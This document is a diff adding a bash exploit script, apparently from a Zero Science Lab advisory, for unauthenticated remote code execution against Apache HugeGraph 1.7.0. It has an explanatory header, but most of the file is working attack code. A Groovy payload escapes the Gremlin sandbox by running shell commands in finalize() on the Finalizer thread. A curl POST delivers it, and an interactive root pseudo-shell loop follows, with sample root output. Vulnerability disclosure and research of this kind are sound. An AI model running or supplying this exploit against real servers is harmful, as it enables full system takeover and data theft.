@@ -1,0 +1,211 @@
+#!/usr/bin/env bash
+#
+#
+# Apache HugeGraph 1.7.0 Sandbox Bypass Remote Code Execution
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://hugegraph.apache.org
+# Affected version: 1.7.0 and 1.8.0-dev (master)
+#
+# Summary: HugeGraph is a full-stack graph system covering graph
+# database, graph computing, and graph AI. It provides complete
+# graph data processing capabilities from storage and real-time
+# querying to offline analysis, and supports both Gremlin and Cypher
+# query languages.
+#
+# Desc: Apache HugeGraph suffers from a remote code execution
+# vulnerability caused by a bypass of its SecurityManager-based
+# Gremlin execution sandbox. HugeGraph executes submitted Gremlin
+# as Groovy and relies on a custom HugeSecurityManager to block
+# operating system access, but that manager only denies calls
+# whose current thread name identifies them as Gremlin threads.
+# By defining a class whose finalize() method runs an operating
+# system command and forcing garbage collection, the command
+# executes on the JVM Finalizer thread, where the check does not
+# apply, and the sandbox is bypassed. Because authentication is
+# disabled in the default configuration, a remote attacker can
+# reach the Gremlin endpoint and execute arbitrary OS commands
+# with root privileges.
+#
+# ============================================================
+# $ ./hg.sh 192.168.1.129 8080
+# [*] priv8 root pseudo-shell @ http://192.168.1.129:8080/gremlin
+# [*] self-test (id):
+# uid=0(root) gid=0(root) groups=0(root)
+#
+# root@hugegreaph:/hugegraph-server# uname -r
+# 7.0.12-linuxkit
+#
+# root@hugegraph:/hugegraph-server# id
+# uid=0(root) gid=0(root) groups=0(root)
+#
+# root@hugegraph:/hugegraph-server# exit
+# [*] bye
+# ============================================================
+#
+# Tested on: GNU/Linux 7.0.12-linuxkit (aarch64)
+#            GNU/Linux 6.12.76-linuxkit (aarch64)
+#            GNU/Linux 6.8.0-88-generic (x86_64)
+#            Groovy 2.5.14
+#            OpenJDK 11
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+# Macedonian Information Security Research & Development Laboratory
+# Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6014
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6014
+#
+#
+# 13.08.2026
+#
+
+
+set -uo pipefail
+TGT="${1:-192.168.1.129}"
+PORT="${2:-8080}"
+URL="http://$TGT:$PORT/gremlin"
+CWD="/hugegraph-server"
+
+print_banner(){
+  mapfile -t _ART <<'ART'
+        .--'''''''''--.
+     .'      .---.      '.
+    /    .-----------.    \
+   /        .-----.        \
+   |       .-.   .-.       |
+   |      /   \ /   \      |
+    \    | .-. | .-. |    /
+     '-._| | | | | | |_.-'
+         | '-' | '-' |
+          \___/ \___/
+       _.-'  /   \  `-._
+     .' _.--|     |--._ '.
+     ' _...-|     |-..._ '
+            |     |
+            '.___.'
+              | |
+             _| |_
+            /\( )/\
+           /  ` '  \
+          | |     | |
+          '-'     '-'
+          | |     | |
+          | |     | |
+          | |-----| |
+       .`/  |     | |/`.
+       |    |     |    |
+       '._.'| .-. |'._.'
+             \ | /
+             | | |
+             | | |
+             | | |
+            /| | |\
+          .'_| | |_`.
+          `. | | | .'
+       .    /  |  \    .
+      /o`.-'  / \  `-.`o\
+     /o  o\ .'   `. /o  o\
+     `.___.'       `.___.'
+ART
+  mapfile -t _INFO <<INFO
+
+
+
+
+
+
+ Apache HugeGraph 1.7.0
+ Unauthenticated Gremlin RCE via a
+ SecurityManager sandbox escape
+ (residual of CVE-2024-27348).
+
+ What this script does:
+   Sends a Groovy payload to the
+   /gremlin endpoint. The command
+   runs inside finalize() on the JVM
+   "Finalizer" thread, whose name is
+   not a Gremlin worker thread, so
+   HugeSecurityManager.checkExec is
+   bypassed and the command executes
+   as the HugeGraph server user.
+
+   Fileless: output returns in the
+   HTTP response (base64 both ways);
+   'cd' is tracked client-side.
+
+ Usage: ./hg.sh [host] [port]
+
+ Advisory ID: ZSL-2026-6014
+ Zero Science Lab
+ https://zeroscience.mk
+INFO
+  local n=${#_ART[@]}; [ ${#_INFO[@]} -gt "$n" ] && n=${#_INFO[@]}
+  local i
+  for ((i=0; i<n; i++)); do
+    printf '  %-40s%s\n' "${_INFO[i]:-}" "${_ART[i]:-}"
+  done
+  echo
+}
+print_banner
+
+read -r -d '' GTMPL <<'GROOVY' || true
+class HgS {
+  static java.util.concurrent.atomic.AtomicBoolean f =
+      new java.util.concurrent.atomic.AtomicBoolean(false)
+  static volatile String out = null
+  protected void finalize() throws Throwable {
+    if (HgS.f.compareAndSet(false, true)) {
+      def cmd = new String(java.util.Base64.decoder.decode("__CMDB64__"))
+      def p = ["/bin/bash", "-c", cmd].execute()
+      p.waitFor()
+      HgS.out = p.text
+    }
+  }
+}
+for (int i = 0; i < 200; i++) { new HgS() }
+def s = System.currentTimeMillis()
+while (HgS.out == null && System.currentTimeMillis() - s < 15000) {
+  System.gc(); Thread.sleep(50)
+}
+HgS.out
+GROOVY
+
+send(){
+  local srv cmdb64 gremlin json resp tok
+  srv="{ $1 ; } 2>&1 | base64 | tr -d '\n'"
+  cmdb64=$(printf '%s' "$srv" | base64 | tr -d '\n')
+  gremlin=${GTMPL//__CMDB64__/$cmdb64}
+  json=$(printf '%s' "$gremlin" \
+         | awk 'BEGIN{ORS=""} {gsub(/\\/,"\\\\"); gsub(/"/,"\\\""); print $0 "\\n"}')
+  resp=$(curl -s -m 25 --compressed -X POST "$URL" \
+              -H 'Content-Type: application/json' -H 'Accept: application/json' \
+              --data "{\"gremlin\":\"$json\"}")
+  tok=$(printf '%s' "$resp" | sed -n 's#.*"data":\["\([A-Za-z0-9+/=]*\)"\].*#\1#p')
+  if [ -n "$tok" ]; then
+    printf '%s' "$tok" | base64 -d 2>/dev/null
+  else
+    printf '%s\n' "$resp"
+  fi
+}
+
+echo "[*] priv8 root pseudo-shell @ $URL"
+echo "[*] self-test (id):"
+send 'id'
+echo
+
+while true; do
+  printf 'root@hugegraph:%s# ' "$CWD"
+  IFS= read -r CMD || break
+  [ -z "$CMD" ] && continue
+  case "$CMD" in exit|quit) break;; esac
+  REQ="cd \"$CWD\" 2>/dev/null; $CMD; printf '\n__CWD__:%s\n' \"\$(pwd)\""
+  OUT=$(send "$REQ")
+  NEWCWD=$(printf '%s' "$OUT" | sed -n 's/^__CWD__://p' | tail -1)
+  printf '%s' "$OUT" | sed '/^__CWD__:/d'
+  [ -n "$NEWCWD" ] && CWD="$NEWCWD"
+done
+echo "[*] bye"
